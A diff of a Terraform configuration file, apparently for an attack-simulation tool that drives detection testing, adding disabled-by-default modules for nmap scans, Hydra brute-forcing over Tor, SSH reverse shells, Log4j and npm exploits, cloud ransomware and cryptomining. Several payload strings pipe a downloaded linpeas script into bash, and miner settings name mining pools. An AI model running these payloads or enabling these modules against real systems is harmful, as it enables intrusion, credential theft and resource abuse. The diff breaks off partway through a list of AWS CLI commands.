@@ -32,6 +32,7 @@ variable "config" {
               badip = object({
                 enabled                     = bool
                 iplist_url                  = string
+                retry_delay_secs            = number
               })
               nmap_port_scan = object({
                 enabled                     = bool
@@ -40,6 +41,7 @@ variable "config" {
               })
               oast = object({
                 enabled                     = bool
+                retry_delay_secs            = number
               })
               codecov = object({
                 enabled                     = bool
@@ -67,9 +69,6 @@ variable "config" {
               })
             })
             execute = object({
-              touch_file = object({
-                enabled                     = bool
-              })
               docker_cpu_miner = object({
                 enabled                     = bool
                 nicehash_image              = string
@@ -81,14 +80,54 @@ variable "config" {
                 minergate_server            = string
                 minergate_user              = string
               })
+              docker_nmap = object({
+                enabled                     = bool
+                use_tor                     = bool
+                scan_local_network          = bool
+                targets                     = list(string)
+                ports                       = list(number)
+                attack_delay                = number
+              })
+              docker_hydra = object({
+                enabled                     = bool
+                use_tor                     = bool
+                scan_local_network          = bool
+                targets                     = list(string)
+                custom_user_list            = list(string)
+                custom_password_list        = list(string)
+                user_list                   = string
+                password_list               = string
+                attack_delay                = number
+              })
               generate_web_traffic = object({
                 enabled                     = bool
                 delay                       = number
                 urls                        = list(string)
               })
+              generate_azure_cli_traffic = object({
+                enabled                     = bool
+                compromised_credentials     = any
+                compromised_keys_user       = string
+                profile                     = string
+                commands                    = list(string)
+              })
             })
           })
           attacker = object({
+            connect = object({
+              ssh_shell_multistage = object({
+                enabled = bool
+                user_list = string
+                password_list = string
+                attack_delay = number
+                payload = string
+                task = string
+                target_ip = string
+                target_port = number
+                reverse_shell_host = string
+                reverse_shell_port = number
+              })
+            })
             listener = object({
               http = object({
                 enabled                     = bool
@@ -111,6 +150,7 @@ variable "config" {
                 iam2rds_role_name           = string
                 iam2rds_session_name        = string
                 attack_delay                = number
+                reverse_shell_host          = string
               })
               port_forward = object({
                 enabled                     = bool
@@ -118,14 +158,22 @@ variable "config" {
               })
             })
             execute = object({
-              vuln_npm_app_attack = object({
+              exploit_npm_app = object({
                 enabled                     = bool
                 target_ip                   = string
                 target_port                 = number
                 payload                     = string
                 attack_delay                = number
               })
-              docker_log4shell_attack = object({
+              exploit_authapp = object({
+                enabled                     = bool
+                target_ip                   = string
+                target_port                 = number
+                attack_delay                = number
+                compromised_user_first_name = string
+                compromised_user_last_name  = string
+              })
+              docker_exploit_log4j_app = object({
                 enabled                     = bool
                 attacker_http_port          = number
                 attacker_ldap_port          = number
@@ -137,7 +185,7 @@ variable "config" {
                 reverse_shell_port          = number
                 attack_delay                = number
               })
-              docker_composite_compromised_credentials_attack = object({
+              docker_composite_compromised_credentials = object({
                 enabled                     = bool
                 compromised_credentials     = any
                 protonvpn_user              = string
@@ -152,7 +200,7 @@ variable "config" {
                 compromised_keys_user       = string
                 attack_delay                = number
               })
-              docker_composite_cloud_ransomware_attack = object({
+              docker_composite_cloud_ransomware = object({
                 enabled                     = bool
                 compromised_credentials     = any
                 protonvpn_user              = string
@@ -167,7 +215,7 @@ variable "config" {
                 compromised_keys_user       = string
                 attack_delay                = number
               })
-              docker_composite_defense_evasion_attack = object({
+              docker_composite_defense_evasion = object({
                 enabled                     = bool
                 compromised_credentials     = any
                 protonvpn_user              = string
@@ -182,7 +230,7 @@ variable "config" {
                 compromised_keys_user       = string
                 attack_delay                = number
               })
-              docker_composite_cloud_cryptomining_attack = object({
+              docker_composite_cloud_cryptomining = object({
                 enabled                     = bool
                 compromised_credentials     = any
                 protonvpn_user              = string
@@ -197,7 +245,7 @@ variable "config" {
                 compromised_keys_user       = string
                 attack_delay                = number
               })
-              docker_composite_host_cryptomining_attack = object({
+              docker_composite_host_cryptomining = object({
                 enabled                     = bool
                 compromised_credentials     = any
                 protonvpn_user              = string
@@ -212,14 +260,44 @@ variable "config" {
                 compromised_keys_user       = string
                 attack_delay                = number
               })
-              docker_composite_host_compromise_attack = object({
+              docker_composite_guardduty = object({
                 enabled                     = bool
+                attack_delay                = number
+              })
+              docker_composite_host_compromise = object({
+                enabled                     = bool
+                attack_delay                = number
+              })
+              docker_nmap = object({
+                enabled                     = bool
+                use_tor                     = bool
+                scan_local_network          = bool
+                targets                     = list(string)
+                ports                       = list(number)
+                attack_delay                = number
+              })
+              docker_hydra = object({
+                enabled                     = bool
+                use_tor                     = bool
+                scan_local_network          = bool
+                targets                     = list(string)
+                custom_user_list            = list(string)
+                custom_password_list        = list(string)
+                user_list                   = string
+                password_list               = string
                 attack_delay                = number
               })
               generate_web_traffic = object({
                 enabled                     = bool
                 delay                       = number
                 urls                        = list(string)
+              })
+              generate_azure_cli_traffic = object({
+                enabled                     = bool
+                compromised_credentials     = any
+                compromised_keys_user       = string
+                profile                     = string
+                commands                    = list(string)
               })
             })
           })
@@ -243,6 +321,7 @@ variable "config" {
               badip = object({
                 enabled                     = bool
                 iplist_url                  = string
+                retry_delay_secs            = number
               })
               nmap_port_scan = object({
                 enabled                     = bool
@@ -251,6 +330,7 @@ variable "config" {
               })
               oast = object({
                 enabled                     = bool
+                retry_delay_secs            = number
               })
               codecov = object({
                 enabled                     = bool
@@ -289,14 +369,54 @@ variable "config" {
                 minergate_server            = string
                 minergate_user              = string
               })
+              docker_nmap = object({
+                enabled                     = bool
+                use_tor                     = bool
+                scan_local_network          = bool
+                targets                     = list(string)
+                ports                       = list(number)
+                attack_delay                = number
+              })
+              docker_hydra = object({
+                enabled                     = bool
+                use_tor                     = bool
+                scan_local_network          = bool
+                targets                     = list(string)
+                custom_user_list            = list(string)
+                custom_password_list        = list(string)
+                user_list                   = string
+                password_list               = string
+                attack_delay                = number
+              })
               generate_web_traffic = object({
                 enabled                     = bool
                 delay                       = number
                 urls                        = list(string)
               })
+              generate_gcp_cli_traffic = object({
+                enabled                     = bool
+                compromised_credentials     = any
+                compromised_keys_user       = string
+                profile                     = string
+                commands                    = list(string)
+              })
             })
           })
           attacker = object({
+            connect = object({
+              ssh_shell_multistage = object({
+                enabled = bool
+                user_list = string
+                password_list = string
+                attack_delay = number
+                payload = string
+                task = string
+                target_ip = string
+                target_port = number
+                reverse_shell_host = string
+                reverse_shell_port = number
+              })
+            })
             listener = object({
               http = object({
                 enabled                     = bool
@@ -319,6 +439,7 @@ variable "config" {
                 iam2rds_role_name           = string
                 iam2rds_session_name        = string
                 attack_delay                = number
+                reverse_shell_host          = string
               })
               port_forward = object({
                 enabled                     = bool
@@ -326,14 +447,22 @@ variable "config" {
               })
             })
             execute = object({
-              vuln_npm_app_attack = object({
+              exploit_npm_app = object({
                 enabled                     = bool
                 target_ip                   = string
                 target_port                 = number
                 payload                     = string
                 attack_delay                = number
               })
-              docker_log4shell_attack = object({
+              exploit_authapp = object({
+                enabled                     = bool
+                target_ip                   = string
+                target_port                 = number
+                attack_delay                = number
+                compromised_user_first_name = string
+                compromised_user_last_name  = string
+              })
+              docker_exploit_log4j_app = object({
                 enabled                     = bool
                 attacker_http_port          = number
                 attacker_ldap_port          = number
@@ -345,7 +474,7 @@ variable "config" {
                 reverse_shell_port          = number
                 attack_delay                = number
               })
-              docker_composite_compromised_credentials_attack = object({
+              docker_composite_compromised_credentials = object({
                 enabled                     = bool
                 compromised_credentials     = any
                 protonvpn_user              = string
@@ -360,7 +489,7 @@ variable "config" {
                 compromised_keys_user       = string
                 attack_delay                = number
               })
-              docker_composite_cloud_ransomware_attack = object({
+              docker_composite_cloud_ransomware = object({
                 enabled                     = bool
                 compromised_credentials     = any
                 protonvpn_user              = string
@@ -375,7 +504,7 @@ variable "config" {
                 compromised_keys_user       = string
                 attack_delay                = number
               })
-              docker_composite_defense_evasion_attack = object({
+              docker_composite_defense_evasion = object({
                 enabled                     = bool
                 compromised_credentials     = any
                 protonvpn_user              = string
@@ -390,7 +519,7 @@ variable "config" {
                 compromised_keys_user       = string
                 attack_delay                = number
               })
-              docker_composite_cloud_cryptomining_attack = object({
+              docker_composite_cloud_cryptomining = object({
                 enabled                     = bool
                 compromised_credentials     = any
                 protonvpn_user              = string
@@ -405,7 +534,7 @@ variable "config" {
                 compromised_keys_user       = string
                 attack_delay                = number
               })
-              docker_composite_host_cryptomining_attack = object({
+              docker_composite_host_cryptomining = object({
                 enabled                     = bool
                 compromised_credentials     = any
                 protonvpn_user              = string
@@ -420,14 +549,44 @@ variable "config" {
                 compromised_keys_user       = string
                 attack_delay                = number
               })
-              docker_composite_host_compromise_attack = object({
+              docker_composite_guardduty = object({
                 enabled                     = bool
+                attack_delay                = number
+              })
+              docker_composite_host_compromise = object({
+                enabled                     = bool
+                attack_delay                = number
+              })
+              docker_nmap = object({
+                enabled                     = bool
+                use_tor                     = bool
+                scan_local_network          = bool
+                targets                     = list(string)
+                ports                       = list(number)
+                attack_delay                = number
+              })
+              docker_hydra = object({
+                enabled                     = bool
+                use_tor                     = bool
+                scan_local_network          = bool
+                targets                     = list(string)
+                custom_user_list            = list(string)
+                custom_password_list        = list(string)
+                user_list                   = string
+                password_list               = string
                 attack_delay                = number
               })
               generate_web_traffic = object({
                 enabled                     = bool
                 delay                       = number
                 urls                        = list(string)
+              })
+              generate_gcp_cli_traffic = object({
+                enabled                     = bool
+                compromised_credentials     = any
+                compromised_keys_user       = string
+                profile                     = string
+                commands                    = list(string)
               })
             })
           })
@@ -451,6 +610,7 @@ variable "config" {
               badip = object({
                 enabled                     = bool
                 iplist_url                  = string
+                retry_delay_secs            = number
               })
               nmap_port_scan = object({
                 enabled                     = bool
@@ -459,6 +619,7 @@ variable "config" {
               })
               oast = object({
                 enabled                     = bool
+                retry_delay_secs            = number
               })
               codecov = object({
                 enabled                     = bool
@@ -525,11 +686,26 @@ variable "config" {
                 enabled                     = bool
                 compromised_credentials     = any
                 compromised_keys_user       = string
+                profile                     = string
                 commands                    = list(string)
               })
             })
           })
           attacker = object({
+            connect = object({
+              ssh_shell_multistage = object({
+                enabled = bool
+                user_list = string
+                password_list = string
+                attack_delay = number
+                payload = string
+                task = string
+                target_ip = string
+                target_port = number
+                reverse_shell_host = string
+                reverse_shell_port = number
+              })
+            })
             listener = object({
               http = object({
                 enabled                     = bool
@@ -552,6 +728,7 @@ variable "config" {
                 iam2rds_role_name           = string
                 iam2rds_session_name        = string
                 attack_delay                = number
+                reverse_shell_host          = string
               })
               port_forward = object({
                 enabled                     = bool
@@ -559,14 +736,22 @@ variable "config" {
               })
             })
             execute = object({
-              vuln_npm_app_attack = object({
+              exploit_npm_app = object({
                 enabled                     = bool
                 target_ip                   = string
                 target_port                 = number
                 payload                     = string
                 attack_delay                = number
               })
-              docker_log4shell_attack = object({
+              exploit_authapp = object({
+                enabled                     = bool
+                target_ip                   = string
+                target_port                 = number
+                attack_delay                = number
+                compromised_user_first_name = string
+                compromised_user_last_name  = string
+              })
+              docker_exploit_log4j_app = object({
                 enabled                     = bool
                 attacker_http_port          = number
                 attacker_ldap_port          = number
@@ -578,7 +763,7 @@ variable "config" {
                 reverse_shell_port          = number
                 attack_delay                = number
               })
-              docker_composite_compromised_credentials_attack = object({
+              docker_composite_compromised_credentials = object({
                 enabled                     = bool
                 compromised_credentials     = any
                 protonvpn_user              = string
@@ -593,7 +778,7 @@ variable "config" {
                 compromised_keys_user       = string
                 attack_delay                = number
               })
-              docker_composite_cloud_ransomware_attack = object({
+              docker_composite_cloud_ransomware = object({
                 enabled                     = bool
                 compromised_credentials     = any
                 protonvpn_user              = string
@@ -608,7 +793,7 @@ variable "config" {
                 compromised_keys_user       = string
                 attack_delay                = number
               })
-              docker_composite_defense_evasion_attack = object({
+              docker_composite_defense_evasion = object({
                 enabled                     = bool
                 compromised_credentials     = any
                 protonvpn_user              = string
@@ -623,7 +808,7 @@ variable "config" {
                 compromised_keys_user       = string
                 attack_delay                = number
               })
-              docker_composite_cloud_cryptomining_attack = object({
+              docker_composite_cloud_cryptomining = object({
                 enabled                     = bool
                 compromised_credentials     = any
                 protonvpn_user              = string
@@ -638,7 +823,7 @@ variable "config" {
                 compromised_keys_user       = string
                 attack_delay                = number
               })
-              docker_composite_host_cryptomining_attack = object({
+              docker_composite_host_cryptomining = object({
                 enabled                     = bool
                 compromised_credentials     = any
                 protonvpn_user              = string
@@ -653,11 +838,11 @@ variable "config" {
                 compromised_keys_user       = string
                 attack_delay                = number
               })
-              docker_composite_guardduty_attack = object({
+              docker_composite_guardduty = object({
                 enabled                     = bool
                 attack_delay                = number
               })
-              docker_composite_host_compromise_attack = object({
+              docker_composite_host_compromise = object({
                 enabled                     = bool
                 attack_delay                = number
               })
@@ -689,6 +874,7 @@ variable "config" {
                 enabled                     = bool
                 compromised_credentials     = any
                 compromised_keys_user       = string
+                profile                     = string
                 commands                    = list(string)
               })
             })
@@ -722,6 +908,7 @@ variable "config" {
               badip = {
                 enabled                     = false
                 iplist_url                  = "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/firehol_level2.netset"
+                retry_delay_secs            = 1800
               }
               nmap_port_scan = {
                 enabled                     = false
@@ -730,6 +917,7 @@ variable "config" {
               }
               oast = {
                 enabled                     = false
+                retry_delay_secs            = 1800
               }
               codecov = {
                 enabled                     = false
@@ -757,9 +945,6 @@ variable "config" {
               }
             }
             execute = {
-              touch_file = {
-                enabled           = false
-              }
               docker_cpu_miner = {
                 enabled                     = false
                 nicehash_image              = "a2ncer/nheqminer_cpu:latest"
@@ -771,28 +956,59 @@ variable "config" {
                 minergate_server            = "stratum+tcp://eth.pool.minergate.com:45791"
                 minergate_user              = null
               },
+              docker_nmap = {
+                enabled                     = false
+                use_tor                     = false
+                scan_local_network          = true
+                targets                     = []
+                ports                       = [22,80,443,1433,3306,5000,5432,5900,6379,8000,8080,8088,8090,8091,9200,27017]
+                attack_delay                = 50400
+              }
+              docker_hydra = {
+                enabled                     = false
+                use_tor                     = false
+                scan_local_network          = true
+                targets                     = []
+                custom_user_list            = []
+                custom_password_list        = []
+                user_list                   = "/opt/usernames/top-usernames-shortlist.txt"
+                password_list               = "/opt/passwords/darkweb2017-top10.txt"
+                attack_delay                = 50400
+              }
               generate_web_traffic = {
                 enabled                     = false
                 delay                       = 60
                 urls                        = []
+              },
+              generate_azure_cli_traffic = {
+                enabled                     = false
+                compromised_credentials     = {}
+                compromised_keys_user       = null
+                profile                     = "azure-traffic"
+                commands                    = []
               }
             }
           }
           attacker = {
+            connect = {
+              ssh_shell_multistage = {
+                enabled = false
+                user_list = "/tmp/hydra-users.txt"
+                password_list = "/tmp/hydra-passwords.txt"
+                attack_delay = 50400
+                payload = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
+                task = "custom"
+                target_ip = null
+                target_port = 22
+                reverse_shell_host = null
+                reverse_shell_port = 4444
+              }
+            }
             listener = {
               http = {
                 enabled                     = false
                 listen_ip                   = "0.0.0.0"
                 listen_port                 = 8080
-              }
-              port_forward = {
-                enabled                     = false
-                port_forwards               = [{
-                                                src_port      = 1234
-                                                dst_port      = 4444
-                                                dst_ip        = "127.0.0.1"
-                                                description   = "Example"
-                                              }]
               }
             }
             responder = {
@@ -800,16 +1016,17 @@ variable "config" {
                 enabled                     = false
                 listen_ip                   = "0.0.0.0"
                 listen_port                 = "4444"
-                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
               }
               reverse_shell_multistage = {
                 enabled                     = false
                 listen_ip                   = "0.0.0.0"
                 listen_port                 = "4444"
-                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
                 iam2rds_role_name           = "rds_user_access_role_ciemdemo"
                 iam2rds_session_name        = "attacker-session"
                 attack_delay                = 50400
+                reverse_shell_host          = null
               }
               port_forward = {
                 enabled                     = false
@@ -817,26 +1034,34 @@ variable "config" {
               }
             }
             execute = {
-              vuln_npm_app_attack = {
+              exploit_npm_app = {
                 enabled                     = false
                 target_ip                   = null
                 target_port                 = 8089
-                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
                 attack_delay                = 50400
               }
-              docker_log4shell_attack = {
+              exploit_authapp = {
+                enabled                     = false
+                target_ip                   = null
+                target_port                 = 8000
+                attack_delay                = 50400
+                compromised_user_first_name = null
+                compromised_user_last_name  = null
+              }
+              docker_exploit_log4j_app = {
                 enabled                     = false
                 attacker_http_port          = 8088
                 attacker_ldap_port          = 1389
                 attacker_ip                 = null
                 target_ip                   = null
                 target_port                 = null
-                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
                 reverse_shell               = false
                 reverse_shell_port          = 0
                 attack_delay                =  50400
               },
-              docker_composite_compromised_credentials_attack = {
+              docker_composite_compromised_credentials = {
                 enabled                     = false
                 compromised_credentials     = {}
                 protonvpn_user              = null
@@ -851,7 +1076,7 @@ variable "config" {
                 compromised_keys_user       = null
                 attack_delay                =  50400
               },
-              docker_composite_cloud_ransomware_attack = {
+              docker_composite_cloud_ransomware = {
                 enabled                     = false
                 compromised_credentials     = {}
                 protonvpn_user              = null
@@ -866,7 +1091,7 @@ variable "config" {
                 compromised_keys_user       = null
                 attack_delay                =  50400
               },
-              docker_composite_defense_evasion_attack = {
+              docker_composite_defense_evasion = {
                 enabled                     = false
                 compromised_credentials     = {}
                 protonvpn_user              = null
@@ -881,7 +1106,7 @@ variable "config" {
                 compromised_keys_user       = null
                 attack_delay                =  50400
               },
-              docker_composite_cloud_cryptomining_attack = {
+              docker_composite_cloud_cryptomining = {
                 enabled                     = false
                 compromised_credentials     = {}
                 protonvpn_user              = null
@@ -896,7 +1121,7 @@ variable "config" {
                 compromised_keys_user       = null
                 attack_delay                =  50400
               },
-              docker_composite_host_cryptomining_attack = {
+              docker_composite_host_cryptomining = {
                 enabled                     = false
                 compromised_credentials     = {}
                 protonvpn_user              = null
@@ -911,14 +1136,44 @@ variable "config" {
                 compromised_keys_user       = null
                 attack_delay                =  50400
               },
-              docker_composite_host_compromise_attack = {
+              docker_composite_guardduty = {
+                enabled                     = false
+                attack_delay                =  50400
+              },
+              docker_composite_host_compromise = {
                 enabled                     = false
                 attack_delay                = 50400
               },
+              docker_nmap = {
+                enabled                     = false
+                use_tor                     = true
+                scan_local_network          = false
+                targets                     = []
+                ports                       = [22,80,443,1433,3306,5000,5432,5900,6379,8000,8080,8088,8090,8091,9200,27017]
+                attack_delay                = 50400
+              }
+              docker_hydra = {
+                enabled                     = false
+                use_tor                     = true
+                scan_local_network          = false
+                targets                     = []
+                custom_user_list            = []
+                custom_password_list        = []
+                user_list                   = "/opt/usernames/top-usernames-shortlist.txt"
+                password_list               = "/opt/passwords/darkweb2017-top10.txt"
+                attack_delay                = 50400
+              }
               generate_web_traffic = {
                 enabled                     = false
                 delay                       = 60
                 urls                        = []
+              },
+              generate_azure_cli_traffic = {
+                enabled                     = false
+                compromised_credentials     = {}
+                compromised_keys_user       = null
+                profile                     = "azure-traffic"
+                commands                    = []
               }
             }
           }
@@ -942,6 +1197,7 @@ variable "config" {
               badip = {
                 enabled                     = false
                 iplist_url                  = "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/firehol_level2.netset"
+                retry_delay_secs            = 1800
               }
               nmap_port_scan = {
                 enabled                     = false
@@ -950,6 +1206,7 @@ variable "config" {
               }
               oast = {
                 enabled                     = false
+                retry_delay_secs            = 1800
               }
               codecov = {
                 enabled                     = false
@@ -988,28 +1245,59 @@ variable "config" {
                 minergate_server            = "stratum+tcp://eth.pool.minergate.com:45791"
                 minergate_user              = null
               },
+              docker_nmap = {
+                enabled                     = false
+                use_tor                     = false
+                scan_local_network          = true
+                targets                     = []
+                ports                       = [22,80,443,1433,3306,5000,5432,5900,6379,8000,8080,8088,8090,8091,9200,27017]
+                attack_delay                = 50400
+              }
+              docker_hydra = {
+                enabled                     = false
+                use_tor                     = false
+                scan_local_network          = true
+                targets                     = []
+                custom_user_list            = []
+                custom_password_list        = []
+                user_list                   = "/opt/usernames/top-usernames-shortlist.txt"
+                password_list               = "/opt/passwords/darkweb2017-top10.txt"
+                attack_delay                = 50400
+              }
               generate_web_traffic = {
                 enabled                     = false
                 delay                       = 60
                 urls                        = []
+              },
+              generate_gcp_cli_traffic = {
+                enabled                     = false
+                compromised_credentials     = {}
+                compromised_keys_user       = null
+                profile                     = "gcp-traffic"
+                commands                    = []
               }
             }
           }
           attacker = {
+            connect = {
+              ssh_shell_multistage = {
+                enabled = false
+                user_list = "/tmp/hydra-users.txt"
+                password_list = "/tmp/hydra-passwords.txt"
+                attack_delay = 50400
+                payload = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
+                task = "custom"
+                target_ip = null
+                target_port = 22
+                reverse_shell_host = null
+                reverse_shell_port = 4444
+              }
+            }
             listener = {
               http = {
                 enabled                     = false
                 listen_ip                   = "0.0.0.0"
                 listen_port                 = 8080
-              }
-              port_forward = {
-                enabled                     = false
-                port_forwards               = [{
-                                                src_port      = 1234
-                                                dst_port      = 4444
-                                                dst_ip        = "127.0.0.1"
-                                                description   = "Example"
-                                              }]
               }
             }
             responder = {
@@ -1017,16 +1305,17 @@ variable "config" {
                 enabled                     = false
                 listen_ip                   = "0.0.0.0"
                 listen_port                 = "4444"
-                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
               }
               reverse_shell_multistage = {
                 enabled                     = false
                 listen_ip                   = "0.0.0.0"
                 listen_port                 = "4444"
-                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
                 iam2rds_role_name           = "rds_user_access_role_ciemdemo"
                 iam2rds_session_name        = "attacker-session"
                 attack_delay                = 50400
+                reverse_shell_host          = null
               }
               port_forward = {
                 enabled                     = false
@@ -1034,26 +1323,34 @@ variable "config" {
               }
             }
             execute = {
-              vuln_npm_app_attack = {
+              exploit_npm_app = {
                 enabled                     = false
                 target_ip                   = null
                 target_port                 = 8089
-                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
                 attack_delay                = 50400
               }
-              docker_log4shell_attack = {
+              exploit_authapp = {
+                enabled                     = false
+                target_ip                   = null
+                target_port                 = 8000
+                attack_delay                = 50400
+                compromised_user_first_name = null
+                compromised_user_last_name  = null
+              }
+              docker_exploit_log4j_app = {
                 enabled                     = false
                 attacker_http_port          = 8088
                 attacker_ldap_port          = 1389
                 attacker_ip                 = null
                 target_ip                   = null
                 target_port                 = null
-                payload                     = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                payload                     = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"
                 reverse_shell               = false
                 reverse_shell_port          = 0
                 attack_delay                =  50400
               },
-              docker_composite_compromised_credentials_attack = {
+              docker_composite_compromised_credentials = {
                 enabled                     = false
                 compromised_credentials     = {}
                 protonvpn_user              = null
@@ -1068,7 +1365,7 @@ variable "config" {
                 compromised_keys_user       = null
                 attack_delay                =  50400
               },
-              docker_composite_cloud_ransomware_attack = {
+              docker_composite_cloud_ransomware = {
                 enabled                     = false
                 compromised_credentials     = {}
                 protonvpn_user              = null
@@ -1083,7 +1380,7 @@ variable "config" {
                 compromised_keys_user       = null
                 attack_delay                =  50400
               },
-              docker_composite_defense_evasion_attack = {
+              docker_composite_defense_evasion = {
                 enabled                     = false
                 compromised_credentials     = {}
                 protonvpn_user              = null
@@ -1098,7 +1395,7 @@ variable "config" {
                 compromised_keys_user       = null
                 attack_delay                =  50400
               },
-              docker_composite_cloud_cryptomining_attack = {
+              docker_composite_cloud_cryptomining = {
                 enabled                     = false
                 compromised_credentials     = {}
                 protonvpn_user              = null
@@ -1113,7 +1410,7 @@ variable "config" {
                 compromised_keys_user       = null
                 attack_delay                =  50400
               },
-              docker_composite_host_cryptomining_attack = {
+              docker_composite_host_cryptomining = {
                 enabled                     = false
                 compromised_credentials     = {}
                 protonvpn_user              = null
@@ -1128,14 +1425,44 @@ variable "config" {
                 compromised_keys_user       = null
                 attack_delay                =  50400
               },
-              docker_composite_host_compromise_attack = {
+              docker_composite_guardduty = {
+                enabled                     = false
+                attack_delay                =  50400
+              },
+              docker_composite_host_compromise = {
                 enabled                     = false
                 attack_delay                = 50400
               },
+              docker_nmap = {
+                enabled                     = false
+                use_tor                     = true
+                scan_local_network          = false
+                targets                     = []
+                ports                       = [22,80,443,1433,3306,5000,5432,5900,6379,8000,8080,8088,8090,8091,9200,27017]
+                attack_delay                = 50400
+              }
+              docker_hydra = {
+                enabled                     = false
+                use_tor                     = true
+                scan_local_network          = false
+                targets                     = []
+                custom_user_list            = []
+                custom_password_list        = []
+                user_list                   = "/opt/usernames/top-usernames-shortlist.txt"
+                password_list               = "/opt/passwords/darkweb2017-top10.txt"
+                attack_delay                = 50400
+              }
               generate_web_traffic = {
                 enabled                     = false
                 delay                       = 60
                 urls                        = []
+              },
+              generate_gcp_cli_traffic = {
+                enabled                     = false
+                compromised_credentials     = {}
+                compromised_keys_user       = null
+                profile                     = "gcp-traffic"
+                commands                    = []
               }
             }
           }
@@ -1159,6 +1486,7 @@ variable "config" {
               badip = {
                 enabled                     = false
                 iplist_url                  = "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/firehol_level2.netset"
+                retry_delay_secs            = 1800
               }
               nmap_port_scan = {
                 enabled                     = false
@@ -1167,6 +1495,7 @@ variable "config" {
               }
               oast = {
                 enabled                     = false
+                retry_delay_secs            = 1800
               }
               codecov = {
                 enabled                     = false
@@ -1233,25 +1562,51 @@ variable "config" {
                 enabled                     = false
                 compromised_credentials     = {}
                 compromised_keys_user       = null
-                commands                    = []
+                profile                     = "aws-traffic"
+                commands                    = [
+                  "x=10",
+                  "opts=\"--output json --color off --no-cli-pager\"",
+                  "while [ $x -gt 0 ]; do ",
+                  "log \"Running: aws sts get-caller-identity $opts\"",
+                  "aws sts get-caller-identity $opts >> $LOGFILE 2>&1",
+                  "log \"Running: aws iam list-users $opts\"",
+                  "aws iam list-users $opts >> $LOGFILE 2>&1",
+                  "log \"Running: aws s3api list-buckets $opts\"",
+                  "aws s3api list-buckets $opts >> $LOGFILE 2>&1",
+                  "log \"Running: aws ec2 describe-instances $opts\"",
+                  "aws ec2 describe-instances $opts >> $LOGFILE 2>&1",
+                  "log \"Running: aws ec2 describe-images --filters \"Name=name,Values=ubuntu-pro-server/images/*20.04*\" $opts\"",
+                  "aws ec2 describe-images --filters \"Name=name,Values=ubuntu-pro-server/images/*20.04*\" $opts >> $LOGFILE 2>&1",
+                  "log \"Running: aws ec2 describe-volumes $opts\"",
+                  "aws ec2 describe-volumes $opts >> $LOGFILE 2>&1",
+                  "log \"Running: aws ec2 describe-vpcs $opts\"",
